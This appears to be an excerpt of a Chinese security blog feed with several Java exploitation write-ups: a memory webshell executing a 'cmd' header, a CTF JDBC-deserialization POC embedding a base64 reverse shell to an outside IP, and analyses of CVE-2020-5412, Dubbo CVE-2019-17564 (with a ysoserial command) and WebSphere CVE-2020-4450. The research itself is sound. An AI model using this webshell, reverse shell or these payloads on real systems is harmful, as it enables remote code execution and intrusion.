h =<span class="hljs-keyword">new</span> HashSet&lt;Object&gt;();        F(Thread.currentThread(),<span class="hljs-number">0</span>);    &#125;<span class="hljs-comment">//    public dfs()&#123;</span><span class="hljs-comment">//        System.out.println("fuck");</span><span class="hljs-comment">//        r = null;</span><span class="hljs-comment">//        p = null;</span><span class="hljs-comment">//        h =new HashSet&lt;Object&gt;();</span><span class="hljs-comment">//        F(Thread.currentThread(),0);</span><span class="hljs-comment">//    &#125;</span>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">i</span><span class="hljs-params">(Object obj)</span></span>&#123;        <span class="hljs-keyword">if</span>(obj==<span class="hljs-keyword">null</span>|| h.contains(obj))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        &#125;        h.add(obj);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">p</span><span class="hljs-params">(Object o, <span class="hljs-keyword">int</span> depth)</span></span>&#123;        <span class="hljs-keyword">if</span>(depth &gt; <span class="hljs-number">52</span>||(r !=<span class="hljs-keyword">null</span>&amp;&amp; p !=<span class="hljs-keyword">null</span>))&#123;            <span class="hljs-keyword">return</span>;        &#125;        <span class="hljs-keyword">if</span>(!i(o))&#123;            <span class="hljs-keyword">if</span>(r ==<span class="hljs-keyword">null</span>&amp;&amp;HttpServletRequest<span class="hljs-class">.<span class="hljs-keyword">class</span>.<span class="hljs-title">isAssignableFrom</span>(<span class="hljs-title">o</span>.<span class="hljs-title">getClass</span>()))</span>&#123;                r = (HttpServletRequest)o;                <span class="hljs-keyword">if</span>(r.getHeader(<span class="hljs-string">"cmd"</span>)==<span class="hljs-keyword">null</span>) &#123;                    r = <span class="hljs-keyword">null</span>;                &#125;<span class="hljs-keyword">else</span>&#123;                    <span class="hljs-keyword">try</span> &#123;                        p = (HttpServletResponse) r.getClass().getMethod(<span class="hljs-string">"getResponse"</span>).invoke(r);                    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;                        r = <span class="hljs-keyword">null</span>;                    &#125;                &#125;            &#125;            <span class="hljs-keyword">if</span>(r !=<span class="hljs-keyword">null</span>&amp;&amp; p !=<span class="hljs-keyword">null</span>)&#123;                <span class="hljs-keyword">try</span> &#123;                    p.getWriter().println(<span class="hljs-keyword">new</span> Scanner(Runtime.getRuntime().exec(r.getHeader(<span class="hljs-string">"cmd"</span>)).getInputStream()).useDelimiter(<span class="hljs-string">"\\A"</span>).next());                    p.getWriter().flush();                    p.getWriter().close();                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;                &#125;                <span class="hljs-keyword">return</span>;            &#125;            F(o,depth+<span class="hljs-number">1</span>);        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">F</span><span class="hljs-params">(Object start, <span class="hljs-keyword">int</span> depth)</span></span>&#123;        Class n=start.getClass();        <span class="hljs-keyword">do</span>&#123;            <span class="hljs-keyword">for</span> (Field declaredField : n.getDeclaredFields()) &#123;                declaredField.setAccessible(<span class="hljs-keyword">true</span>);                Object o = <span class="hljs-keyword">null</span>;                <span class="hljs-keyword">try</span>&#123;                    o = declaredField.get(start);                    <span class="hljs-keyword">if</span>(!o.getClass().isArray())&#123;                        p(o,depth);                    &#125;<span class="hljs-keyword">else</span>&#123;                        <span class="hljs-keyword">for</span> (Object q : (Object[]) o) &#123;                            p(q, depth);                        &#125;                    &#125;                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;                &#125;            &#125;        &#125;<span class="hljs-keyword">while</span>(                (n = n.getSuperclass())!=<span class="hljs-keyword">null</span>        );    &#125;&#125;</code></pre><ol start="2"><li>将编译后的dfs 转为字节码</li></ol><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.osword.defineclass;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoaderMain</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        <span class="hljs-keyword">byte</span>[] bs = getBytesByFile(<span class="hljs-string">"/Users/osword/Desktop/rep/target/classes/com/osword/defineclass/dfs.class"</span>);        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; bs.length; i++) &#123;            System.out.print(bs[i]+<span class="hljs-string">","</span>);        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] getBytesByFile(String pathStr) &#123;        File file = <span class="hljs-keyword">new</span> File(pathStr);        <span class="hljs-keyword">try</span> &#123;            FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(file);            ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream(<span class="hljs-number">1000</span>);            <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1000</span>];            <span class="hljs-keyword">int</span> n;            <span class="hljs-keyword">while</span> ((n = fis.read(b)) != -<span class="hljs-number">1</span>) &#123;                bos.write(b, <span class="hljs-number">0</span>, n);            &#125;            fis.close();            <span class="hljs-keyword">byte</span>[] data = bos.toByteArray();            bos.close();            <span class="hljs-keyword">return</span> data;        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            e.printStackTrace();        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    &#125;&#125;</code></pre><ol start="3"><li>字节码贴入CommonsCollections6中反射，形如如下调用</li></ol><pre><code class="hljs java">DefiningClassLoader.class.getDeclaredConstructor().newInstance(new Object[0]).defineClass("com.osword.defineclass.dfs",bs).getMethod("main").invoke(null);</code></pre><p>修改cc6如下,替换<code>transformers</code>构造</p><pre><code class="hljs java"><span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;           <span class="hljs-keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="hljs-class">.<span class="hljs-keyword">class</span>),</span>           new InvokerTransformer("getDeclaredConstructor", new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),           new InvokerTransformer("newInstance", new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),           <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"defineClass"</span>,               new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;"com.osword.defineclass.dfs", bs&#125;),           new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"main", new Class[]&#123;String[].class&#125;&#125;),           new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;null&#125;&#125;),           <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-keyword">new</span> HashSet())&#125;;</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯Easy Java题解</title>
    <link href="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AFEasy-Java%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AFEasy-Java%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Easy-Java-三血"><a href="#Easy-Java-三血" class="headerlink" title="Easy Java(三血)"></a>Easy Java(三血)</h1><p>考点：</p><p>​        1.序列化入口构造</p><p>​        2.Mysql JDBC反序列化</p><p>拿到源码直接看控制器代码，在<code>hello</code>方法中对传入的cookie进行反序列化</p><p><img src="./image-20200911001449297.png" srcset="/img/loading.gif" alt="image-20200911001449297"></p><p>反序列化后返回实例化对象<code>info</code>,且该类最后会执行<code>getAllinfo</code>方法.如果直接在<code>Info</code>接口下找<code>getAllInfo</code>方法执行，发现并没有进一步的危险操作.所以把目光放到<code>InfoInvocationHandler</code>类中该方法实现<code>Serializabale</code>接口可以被序列化.在实现的方法中带有<code>invoke</code>方法.</p><p>有复现过cc链相关知识可以知道要执行<code>invoke</code>方法需要被<code>Proxy</code>代理类封装，被封装后在执行方法后优先执行<code>invoke</code>方法.而执行的条件就是在上一步分析中实例化后的对象执行<code>info.getAllinfo()</code></p><p>Ps:不能通过<code>method.invoke</code>反射执行危险函数，这里对<code>this.info</code>做了类型限制，找不到该Info类型下危险调用</p><p><img src="./image-20200911001820075.png" srcset="/img/loading.gif" alt="image-20200911001820075"></p><p>所以可以构造如下exp,将DataBaseInfo实例，封装进Proxy类中，有意思的是这里Proxy类可以转化为Info类型，这样就可以满足反序列化需要转换为Info类型，就不会爆<code>cast Exception</code>异常.</p><p><img src="./image-20200911002123292.png" srcset="/img/loading.gif" alt="image-20200911002123292"></p><p>构造完序列化入口，发现在执行InfoInvocationHandler.invoke方法中，调用了<code>this.info.checkAllInfo()</code>,翻看代码，在<code>DatabaseInfo.checkAllInfo</code>方法中执行了<code>connect</code>方法，而该方法的构造能够反序列化可控<code>jdbc</code>链接，可以导致<code>JDBC</code>反序列化.</p><p><img src="./image-20200911003036880.png" srcset="/img/loading.gif" alt="image-20200911003036880"></p><p>关于<code>JDBC</code>反序列化原理，精心构造的<code>jdbc</code>链接，连接恶意服务器后能够发送恶意利用链字节码，导致客户端应用执行反序列化操作.</p><p>具体参考：<a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>JDBC反序列化有两个利用</p><p>1.任意文件读取,这里不知道服务器flag文件存放，读不到,在读取时候需要加个配置条件<code>allowLoadLocalInfile=true</code></p><p><img src="./6D1F9E6A052994A38BA0AFD1184217FC.jpg" srcset="/img/loading.gif" alt="6D1F9E6A052994A38BA0AFD1184217FC"></p><p>2.反序列化，根据web应用依赖来，翻看<code>/Users/osword/.m2/repository/org/nibblesec/serialkiller/0.4/serialkiller-0.4.pom</code>发现存在cc3.2.1依赖。可以直接利用CommonsCollections5直接打（PS:因为cc5 利用<code>BadAttributeValueExpException</code>符合jdk8环境,具体可以自己跟一下)</p><p><img src="./image-20200911003800566.png" srcset="/img/loading.gif" alt="image-20200911003800566"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> gdufs.challenge.web;<span class="hljs-keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;<span class="hljs-keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;<span class="hljs-keyword">import</span> gdufs.challenge.web.model.Info;<span class="hljs-keyword">import</span> gdufs.challenge.web.model.UserInfo;<span class="hljs-keyword">import</span> org.apache.commons.collections.Factory;<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<span class="hljs-keyword">import</span> java.io.FileInputStream;<span class="hljs-keyword">import</span> java.io.FileOutputStream;<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<span class="hljs-keyword">import</span> java.lang.annotation.Retention;<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;        DatabaseInfo databaseInfo = <span class="hljs-keyword">new</span> DatabaseInfo();        databaseInfo.setHost(<span class="hljs-string">"vps"</span>);        databaseInfo.setPort(<span class="hljs-string">"3306"</span>);        databaseInfo.setUsername(<span class="hljs-string">"yso_CommonsCollections5_bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyMC43Ny4xODAuOTcvMTAyNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>);        databaseInfo.setPassword(<span class="hljs-string">"123&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"</span>);        ClassLoader classLoader = databaseInfo.getClass().getClassLoader();        Class[] interfaces = databaseInfo.getClass().getInterfaces();        InfoInvocationHandler infoInvocationHandler = <span class="hljs-keyword">new</span> InfoInvocationHandler(databaseInfo);        Info proxy = (Info)Proxy.newProxyInstance(classLoader,interfaces,infoInvocationHandler);        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);        objectOutputStream.writeObject(proxy);        objectOutputStream.flush();        objectOutputStream.close();        System.out.printf(<span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray())));    &#125;&#125;</code></pre><p>vps起<code>Mysql_fake_server</code>服务，需要在当前提前备好<code>ysoserial-0.0.6-SNAPSHOT-all.jar</code>,exp生成的base64直接打</p><p><img src="./image-20200911004211999.png" srcset="/img/loading.gif" alt="image-20200911004211999"></p><p><img src="./image-20200911004048194.png" srcset="/img/loading.gif" alt="image-20200911004048194"></p><p><img src="./image-20200911004114303.png" srcset="/img/loading.gif" alt="image-20200911004114303"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-5412分析复现</title>
    <link href="/2020/09/01/CVE-2020-5412%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <url>/2020/09/01/CVE-2020-5412%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Hystrix-断路器"><a href="#Hystrix-断路器" class="headerlink" title="Hystrix(断路器)"></a>Hystrix(断路器)</h1><p>Hystrix 可以在系统不稳定时及时断开外部请求，防止雪崩，以达到保护系统的整体稳定性。但是由于这些操作都由Hystrix 自动完成，开发人员无法获知到底哪些服务有问题，以及相应请求的成功率、响应时间等信息以备后续分析和改进</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mkheck/</span>aou-hystrix-dashboard</code></pre><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>proxy.stream接口原始功能是为了实时获取服务器聚合后的数据，并将信息实时推送给长连接的response。但是该功能点并未做限制能够造成SSRF</p><h1 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h1><p>Spring Cloud Netflix</p><pre><code class="hljs angelscript"><span class="hljs-number">2.2</span><span class="hljs-number">.0</span> to <span class="hljs-number">2.2</span><span class="hljs-number">.3</span><span class="hljs-number">2.1</span><span class="hljs-number">.0</span> to <span class="hljs-number">2.1</span><span class="hljs-number">.5</span></code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>访问<a href="http://url/proxy.stream接口，由`ProxyStreamServlet`类处理数据.通过传入orign参数能够经`java.net.Socket.connect`连接到恶意URL" target="_blank" rel="noopener">http://url/proxy.stream接口，由`ProxyStreamServlet`类处理数据.通过传入orign参数能够经`java.net.Socket.connect`连接到恶意URL</a>.</p><p><img src="./image-20200901205330345.png" srcset="/img/loading.gif" alt="image-20200901205330345"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><a href="https://github.com/spring-cloud/spring-cloud-netflix/commit/624bbc8b50f7b5b6a1addc62040e4f2587f24f1b" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-netflix/commit/624bbc8b50f7b5b6a1addc62040e4f2587f24f1b</a></p><p>只允许访问配置文件中的URL</p><p><img src="./image-20200901220033092.png" srcset="/img/loading.gif" alt="image-20200901220033092"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://tanzu.vmware.com/security/cve-2020-5412" target="_blank" rel="noopener">https://tanzu.vmware.com/security/cve-2020-5412</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dubbo历史漏洞之CVE-2019-17564</title>
    <link href="/2020/08/26/Dubbo%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%B9%8BCVE-2019-17564/"/>
    <url>/2020/08/26/Dubbo%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%B9%8BCVE-2019-17564/</url>
    
    <content type="html"><![CDATA[<h1 id="Dubbo框架"><a href="#Dubbo框架" class="headerlink" title="Dubbo框架"></a>Dubbo框架</h1><p>​    Dubbo是一个分布式服务框架，以及阿里巴巴内部的SOA服务化治理方案的核心框架。其功能主要包括：高性能NIO通讯及多协议集成，服务动态寻址与路由，软负载均衡与容错，依赖分析与降级等。</p><p>​        首先将程序组件化成一个个相对独立的服务，然后就可以对服务进行分布式；而且，它有注册中心通过监听，实时发现着新服务，并部署，还可以推送给客户端；它还集成了负载均衡的解决方案，利用随机算法来讲各个服务科学地分配到多台服务器上；当然，它也集成了容错机制，来提高集群的稳定性。</p><h1 id="CVE-2019-17564"><a href="#CVE-2019-17564" class="headerlink" title="CVE-2019-17564"></a>CVE-2019-17564</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​        Dubbo在处理HTTP数据时候会调用RPC组件，对数据编码、序列化、反序列化。利用Spring HTTP Invoker框架处理，直接反序列化数据，造成远程代码执行漏洞</p><p><img src="./image-20200825222722960.png" srcset="/img/loading.gif" alt="image-20200825222722960"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载地址：<a href="https://github.com/apache/dubbo-samples/tree/master/java/dubbo-samples-http" target="_blank" rel="noopener">https://github.com/apache/dubbo-samples/tree/master/java/dubbo-samples-http</a></p><p><strong>zookeeper</strong>:<code>docker run --rm --name zookeeper -p 2181:2181 zookeeper</code></p><p>恶意类依赖</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><p>修改Dubbo版本为2.7.3</p><p><img src="./image-20200825231507960.png" srcset="/img/loading.gif" alt="image-20200825231507960"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该例子下<code>DemoService</code>被添加进配置文件，注册服务</p><p><img src="./image-20200826211055037.png" srcset="/img/loading.gif" alt="image-20200826211055037"></p><p>​    <code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code> 是 Spring 封装的一个服务暴露器，它会以 serviceInterface 为公共接口，以 service 为实现类向外提供服务，初始化<code>HttpInvokerServiceExporter</code>类处理之后的序列化和反序列化操作以及处理HTTP请求.</p><p><img src="./image-20200825223445451.png" srcset="/img/loading.gif" alt="image-20200825223445451"></p><p><code>HttpInvokerServiceExporter.readRemoteInvocation</code>从输入流中提取响应的序列化信息.在<code>RemoteInvocationSerializingExporter.doreadRemoterInvocation</code>方法中反序列化.</p><p><img src="./image-20200825231036067.png" srcset="/img/loading.gif" alt="image-20200825231036067"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code class="hljs bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 <span class="hljs-string">"open /System/Applications/Calculator.app"</span> &gt; /tmp/payload.serhttp://192.168.199.1:8890/org.apache.dubbo.samples.http.api.DemoService</code></pre><p><img src="./image-20200825231140966.png" srcset="/img/loading.gif" alt="image-20200825231140966"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>将RPC框架改为Json-Rpc,</p><p><img src="./image-20200826205443137.png" srcset="/img/loading.gif" alt="image-20200826205443137"></p><p>为什么该框架能够防御反序列化漏洞,在JsonRpcBasciServer.handleObject方法中,对需要执行的方法，会从以注册的接口中寻找合适方法.所以无法可控任意类执行任意方法.打到防御的效果.</p><p><img src="./image-20200826205618593.png" srcset="/img/loading.gif" alt="image-20200826205618593"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    其实该漏洞本身是Spring Invoker类的滥用导致漏洞。RPC框架中为了负载均衡，会动态调用类，需要利用RPC组件进行实现就造成了一定的隐患。针对版本的修复，可以看到，直接限制了最后实例化的类为当前注册的服务类.</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cloud.tencent.com/developer/article/1465448" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1465448</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Dubbo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebSphere IIOP反序列化(CVE-2020-4450)</title>
    <link href="/2020/08/15/WebSphere-IIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2020-4450/"/>
    <url>/2020/08/15/WebSphere-IIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2020-4450/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    WebSphere 是 IBM 的软件平台。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。WebSphere 提供了可靠、灵活和健壮的软件。</p><h1 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h1><pre><code class="hljs routeros">WebSphere Application<span class="hljs-built_in"> Server </span>9.0.0.0 - 9.0.5.4WebSphere Application<span class="hljs-built_in"> Server </span>8.5.0.0 - 8.5.5.17WebSphere Application<span class="hljs-built_in"> Server </span>8.0.0.0 - 8.0.0.15WebSphere Application<span class="hljs-built_in"> Server </span>7.0.0.0 - 7.0.0.45</code></pre><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>​    RMI-IIOP反序列化构造恶意对象，利用RMIBYPASS思路寻找特定工厂类，处理lookup方法请求返回的Reference对象获取危险属性值，websphere应用请求WSIF服务将XML文件中的operation…映射执行<code>javax.el.ELProcessor.eval()</code>方法造成RCE</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>参考：<a href="https://www.cnblogs.com/luzhanshi/p/11432901.html(选择9.0.0.2版本)" target="_blank" rel="noopener">https://www.cnblogs.com/luzhanshi/p/11432901.html(选择9.0.0.2版本)</a></p><p>存储库：<a href="http://www-147.ibm.com/software/repositorymanager/com.ibm.websphere.APPCLIENT.v90" target="_blank" rel="noopener">http://www-147.ibm.com/software/repositorymanager/com.ibm.websphere.APPCLIENT.v90</a></p><p>下载过程中不勾选补丁</p><p><img src="./image-20200815134858279.png" srcset="/img/loading.gif" alt="image-20200815134858279"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="ServiceContext实例构造"><a href="#ServiceContext实例构造" class="headerlink" title="ServiceContext实例构造"></a>ServiceContext实例构造</h2><p>通过文章描述打个桩至<code>TxServerInterceptor.receive_request</code>，运行脚本</p><pre><code class="hljs java">Properties env =<span class="hljs-keyword">new</span> Properties();       env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">"com.ibm.websphere.naming.WsnInitialContextFactory"</span>);     env.put(Context.PROVIDER_URL,<span class="hljs-string">"iiop://192.168.6.130:2809"</span>);     InitialContext initialContext =<span class="hljs-keyword">new</span> InitialContext(env);     initialContext.list(<span class="hljs-string">""</span>);</code></pre><p><img src="./image-20200813193244805.png" srcset="/img/loading.gif" alt="image-20200813193244805"></p><p>ZDI师傅描述，找到漏洞入口点<code>demarshalContext</code>方法，需要获取的<code>serviceContext</code>和<code>serviceContext.context_data</code>不为空.</p><p><img src="./image-20200813193352970.png" srcset="/img/loading.gif" alt="image-20200813193352970"></p><p>所以该处需要构造一个<code>serviceContext</code>实例.跟踪通信脚本，调试到最终通信的执行点<code>ClientDelegate.invoke</code>方法.var4变量中带有<code>serviceContexts</code>实例.可以进行反射构造</p><p><img src="./image-20200813194231643.png" srcset="/img/loading.gif" alt="image-20200813194231643"></p><p>回溯该值，位于<code>Connection.getServiceContexts</code>方法中返回的<code>this.connectionContexts</code>.该值可以通过<code>setConnectionContexts</code>设置.</p><p><img src="./image-20200813194747674.png" srcset="/img/loading.gif" alt="image-20200813194747674"></p><p>现在需要构造通信将<code>serviceContext</code>封装进去，跟进代码在GIOPImpl.getConnection中获得连接.</p><p><img src="./image-20200813200504648.png" srcset="/img/loading.gif" alt="image-20200813200504648"></p><p>至于<code>getConnection</code>中的参数<code>IOR、Profile、ClientDlegate</code>，可以参照第一次通信时<code>WsnInitCtx Debug</code>变量参数值调试构造</p><p><img src="./image-20200813204127654.png" srcset="/img/loading.gif" alt="image-20200813204127654"></p><h2 id="输入流构造"><a href="#输入流构造" class="headerlink" title="输入流构造"></a>输入流构造</h2><p>成功构造<code>ServiceContext</code>后，应用执行至<code>TxInterceptorHelper.demarshalContext</code>方法体中.这里需要使用<code>TxInterceptorHelper.marshalContext</code>精心构造输入流.</p><p><img src="./image-20200814223418411.png" srcset="/img/loading.gif" alt="image-20200814223418411"></p><p>第80行<code>inputStream.read_any()</code>开始从输入流读取IDL any值.了解过<code>CORBA</code>通信可以知道需要反序列化数据会存储在<code>Any</code>类中，可以通过类似以下方式，载入需要反序列化恶意对象数据流.而该<code>Any</code>对象会在<code>TxInterceptorHelper.marshalContext</code>构造输入流时在<code>PropagationContext</code>构造方法中传入.</p><pre><code class="hljs java">....ORB orb = ORB.init();Any any = orb.create_any();....any.insert_Value((Serializeable)o);</code></pre><p><img src="./image-20200814230713715.png" srcset="/img/loading.gif" alt="image-20200814230713715"></p><h2 id="RCE利用链"><a href="#RCE利用链" class="headerlink" title="RCE利用链"></a>RCE利用链</h2><p>ZDI师傅利用<code>org.apache.wsif.providers.ejb.WSIFPort_EJB</code>作为恶意类，由于Webpshere自身CLassLoader原因，只能利用<code>handle.getEJBObject</code>进一步实现RCE.而此处需要通过Handle类型对象.</p><p><img src="./image-20200814233348900.png" srcset="/img/loading.gif" alt="image-20200814233348900"></p><p>跟进<code>WSIFPort_EJB.writeObject</code>方法，通过<code>this.fieldEjbOject.getHandle()</code>方法返回<code>handle</code>对象，所以可以重写<code>EJSWrapper.getHandle</code>多次反射构造<code>EntityHandle</code>（Handle类型）</p><p><img src="./image-20200814235616774.png" srcset="/img/loading.gif" alt="image-20200814235616774"></p><p>具体构造还是一个个Debug 缺啥就反射构造即可</p><p><img src="./image-20200815000836388.png" srcset="/img/loading.gif" alt="image-20200815000836388"></p><h1 id="RMI-Bypass-WSIF"><a href="#RMI-Bypass-WSIF" class="headerlink" title="RMI Bypass+WSIF"></a>RMI Bypass+WSIF</h1><p>进一步到达漏洞点EntityHandle.getEJBObject方法，由于jdk版本和RMi自实现的lookup原因，借用RMIBYPASS思路，启动恶意RMI服务，指定工厂类通过lookup从RMI服务中获取Reference对象.利用<code>getObjectInstance</code>方法引用可控的危险属性.最后由于homeClass可控，进一步获得EJBHome类型的实例home.</p><p><img src="./image-20200815120534448.png" srcset="/img/loading.gif" alt="image-20200815120534448"></p><p>现在目的是寻找工厂类，需要实现<code>javax.naming.spi.ObjectFactory</code>且具有<code>getObjectInstance</code>方法.ZDI师傅此处利用<code>org.apache.wsif.naming.WSIFServiceObjectFactory</code>工厂类。通过<code>ObjectFactoryHelper.getObjectInstanceViaContextDotObjectFactories</code>方法进一步调用<code>WSIF</code>工厂类的<code>getObjectInstance</code>方法.</p><p><img src="./image-20200815122955151.png" srcset="/img/loading.gif" alt="image-20200815122955151"></p><p>该类中的<code>getObjectInstance</code>方法获取远程RMI服务设置的属性值.进一步请求WSIF服务，最后返回代理对象stub.</p><p><img src="./image-20200815124416159.png" srcset="/img/loading.gif" alt="image-20200815124416159"></p><p>返回的代理对象由于代理机制会触发invoke方法，映射字段</p><p><img src="./image-20200815125735409.png" srcset="/img/loading.gif" alt="image-20200815125735409"></p><p>现在就是需要精心构造XML文件，使之后的映射能够调用到危险函数.</p><p>参考XML编写：<a 